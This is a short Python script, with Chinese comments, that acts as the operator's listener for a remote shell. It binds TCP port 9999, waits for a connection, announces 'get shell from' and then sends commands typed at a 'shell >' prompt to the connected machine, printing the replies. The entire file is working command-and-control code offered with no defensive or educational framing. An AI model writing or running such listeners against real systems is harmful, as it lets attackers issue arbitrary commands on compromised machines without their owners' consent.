# encoding=utf-8

import socket


def run_cmd(client):
    while True:
        cmd = input("shell >")
        if cmd == "quit()":
            break
        else:
            client.send(cmd.encode('utf-8'))
            ans = client.recv(1024)
            print(ans.decode('utf-8'))


def main():
    serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = socket.gethostname()  # 设置为本机IP地址
    port = 9999  # 设置远程shell连接的端口号
    serversocket.bind((host, port))
    serversocket.listen(5)

    client, addr = serversocket.accept()
    print("get shell from: %s" % str(addr))
    run_cmd(client)
    client.close()

if __name__ == '__main__':
    main()
